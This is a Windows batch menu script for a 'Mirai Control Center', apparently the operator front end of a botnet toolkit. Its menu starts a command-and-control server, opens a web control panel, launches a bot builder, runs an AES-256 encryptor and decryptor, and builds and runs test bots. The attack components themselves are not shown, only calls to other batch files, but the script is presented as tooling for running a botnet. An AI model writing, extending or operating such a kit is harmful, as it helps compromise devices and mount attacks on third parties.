@echo off
color 0A
cls

:MENU
echo.
echo ╔══════════════════════════════════════════════════════════════════╗
echo ║                                                                  ║
echo ║        ███╗   ███╗██╗██████╗  █████╗ ██╗    ██╗██╗███╗   ██╗   ║
echo ║        ████╗ ████║██║██╔══██╗██╔══██╗██║    ██║██║████╗  ██║   ║
echo ║        ██╔████╔██║██║██████╔╝███████║██║ █╗ ██║██║██╔██╗ ██║   ║
echo ║        ██║╚██╔╝██║██║██╔══██╗██╔══██║██║███╗██║██║██║╚██╗██║   ║
echo ║        ██║ ╚═╝ ██║██║██║  ██║██║  ██║╚███╔███╔╝██║██║ ╚████║   ║
echo ║        ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ║
echo ║                                                                  ║
echo ║              COMPLETE CONTROL CENTER - Main Menu                 ║
echo ║                                                                  ║
echo ╚══════════════════════════════════════════════════════════════════╝
echo.
echo  [1] 🖥️  Start C^&C Server
echo  [2] 🌐 Open Control Panel (Web UI)
echo  [3] 🔨 Launch Bot Builder
echo  [4] 🔒 Launch Encryptor (Rawr AES-256)
echo  [5] 🔓 Launch Decryptor (Rawr AES-256)
echo  [6] 🤖 Build ^& Run Test Bot
echo  [7] 🧪 Run Complete Test System
echo  [8] 📖 View Documentation
echo  [9] ❌ Exit
echo.
set /p choice="Select option [1-9]: "

if "%choice%"=="1" goto START_SERVER
if "%choice%"=="2" goto CONTROL_PANEL
if "%choice%"=="3" goto BOT_BUILDER
if "%choice%"=="4" goto ENCRYPTOR
if "%choice%"=="5" goto DECRYPTOR
if "%choice%"=="6" goto TEST_BOT
if "%choice%"=="7" goto FULL_TEST
if "%choice%"=="8" goto DOCS
if "%choice%"=="9" goto EXIT

echo Invalid choice!
pause
goto MENU

:START_SERVER
cls
echo ========================================
echo  Starting C^&C Server...
echo ========================================
echo.
cd MiraiCommandCenter
call START-SERVER.bat
cd ..
pause
goto MENU

:CONTROL_PANEL
cls
echo ========================================
echo  Opening Control Panel...
echo ========================================
echo.
start http://localhost:8080
echo Control panel opened in browser!
echo Make sure C^&C Server is running (option 1)
pause
goto MENU

:BOT_BUILDER
cls
echo ========================================
echo  Launching Bot Builder...
echo ========================================
echo.
cd MiraiCommandCenter
call LAUNCH-BOT-BUILDER.bat
cd ..
pause
goto MENU

:ENCRYPTOR
cls
echo ========================================
echo  Launching Encryptor...
echo ========================================
echo.
cd MiraiCommandCenter
call LAUNCH-ENCRYPTOR.bat
cd ..
goto MENU

:DECRYPTOR
cls
echo ========================================
echo  Launching Decryptor...
echo ========================================
echo.
cd MiraiCommandCenter
call LAUNCH-DECRYPTOR.bat
cd ..
goto MENU

:TEST_BOT
cls
echo ========================================
echo  Building Test Bot...
echo ========================================
echo.
call BUILD-TEST-BOT.bat
if %errorlevel% equ 0 (
    echo.
    echo Build successful!
    echo.
    set /p run="Run test bot now? (Y/N): "
    if /i "%run%"=="Y" (
        call RUN-TEST-BOT.bat
    )
)
pause
goto MENU

:FULL_TEST
cls
echo ========================================
echo  Running Complete Test System...
echo ========================================
echo.
call COMPLETE-TEST-SYSTEM.bat
pause
goto MENU

:DOCS
cls
echo ========================================
echo  Documentation Files
echo ========================================
echo.
echo  Available documentation:
echo.
echo  [1] START-HERE.txt         - Quick visual guide
echo  [2] TESTING-GUIDE.md       - Complete testing workflows
echo  [3] README.md              - Project overview
echo  [4] MIRAI-WINDOWS-FINAL-STATUS.md - System status
echo.
set /p doc="Select document [1-4] or X to go back: "

if "%doc%"=="1" type START-HERE.txt ^| more
if "%doc%"=="2" type TESTING-GUIDE.md ^| more
if "%doc%"=="3" type README.md ^| more
if "%doc%"=="4" type MIRAI-WINDOWS-FINAL-STATUS.md ^| more

pause
goto MENU

:EXIT
cls
echo.
echo ========================================
echo  Thanks for using Mirai Control Center!
echo ========================================
echo.
echo  Remember to cure test bots when done!
echo.
timeout /t 2 /nobreak >nul
exit

